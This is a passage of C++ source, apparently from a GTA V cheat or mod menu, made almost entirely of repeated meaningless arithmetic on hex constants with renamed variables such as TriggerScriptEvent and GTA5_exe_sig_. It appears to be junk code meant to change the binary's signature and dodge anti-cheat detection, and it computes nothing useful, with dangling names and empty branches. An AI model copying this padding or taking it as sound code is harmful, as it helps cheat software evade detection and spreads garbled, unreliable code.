				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			std::ofstream outfile(FilePathAndExtension);
			outfile.close();
		}
		void LimparArquivo(string arquivoTXT)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
